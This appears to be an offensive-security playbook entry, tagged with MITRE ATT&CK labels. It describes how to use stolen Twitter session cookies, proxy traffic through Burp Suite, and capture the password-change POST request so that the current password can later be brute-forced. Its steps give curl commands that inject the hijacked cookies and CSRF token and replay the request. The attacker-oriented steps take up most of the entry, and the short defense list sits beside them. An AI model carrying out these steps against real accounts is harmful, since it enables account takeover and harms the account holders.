---
id: proc-970157-setup-intercept
tags:
  - session-hijacking
  - request-interception
  - twitter
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/twitter-password-change-post]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:31:43.173Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Setup-and-Intercept-Twitter-Password-Change-Request

## Summary

This procedure sets up a hijacked Twitter session and intercepts the password change request to prepare for brute-force exploitation, enabling attackers to target the vulnerable endpoint without triggering session invalidation.

## Description

In a scenario where an attacker has obtained session cookies (e.g., via XSS or MITM), this procedure navigates the Twitter web interface to the password settings, initiates a change request, and uses a proxy like Burp Suite to capture the POST to /i/account/change_password.json. The endpoint lacks rate limiting, allowing subsequent brute-force. Prerequisites include a valid session and proxy configuration. Expected outcome: Captured request ready for modification, preserving auth headers like Bearer token and CSRF.

## Requirements

1. Hijacked Twitter session cookies (auth_token, ct0, _twitter_sess)
2. Browser configured to proxy traffic through Burp Suite (e.g., FoxyProxy extension)
3. Access to Twitter web interface (https://twitter.com)

## Defense

Defensive measures and detection strategies:

- Implement session binding to IP/user-agent and monitor for anomalous requests
- Enable rate limiting on all auth endpoints, including password changes
- Log and alert on multiple failed password verification attempts from the same session

## Objectives

1. Gain access to password change form in hijacked session
2. Capture the exact request structure for replay
3. Preserve session integrity for follow-on brute-force

## Instructions

### Step 1: Configure Proxy and Load Hijacked Session

**Context**: Set up interception by routing browser traffic through Burp and injecting session cookies.

**Command** ([[commands/twitter-password-change-post]]):
Use browser dev tools or extension to set cookies, then navigate to https://twitter.com/settings/password.

```bash
# Equivalent curl for session setup (manual cookie injection in browser)
curl -X GET "https://twitter.com/settings/password" \
  -H "Cookie: auth_token=██████████; ct0=██████; _twitter_sess=████" \
  -H "Authorization: Bearer ████"
```

> This loads the settings page; expected output is the password form HTML. Success if no 401/403 errors.

### Step 2: Initiate and Intercept Request

**Context**: Submit a dummy password change to capture the POST request.

**Command** ([[commands/twitter-password-change-post]]):
Fill form with random values and submit; intercept in Burp Proxy.

```bash
# Intercepted and modified for demo
curl -X POST "https://api.twitter.com/i/account/change_password.json" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: auth_token=██████████; ct0=██████" \
  -H "x-csrf-token: ████████" \
  -d "current_password=dummy&password=newpass&password_confirmation=newpass"
```

> Expected output: Intercepted request in Burp with 403 or similar if not forwarded; forward to capture full structure.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/twitter-password-change-post]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- session-hijacking
- request-interception
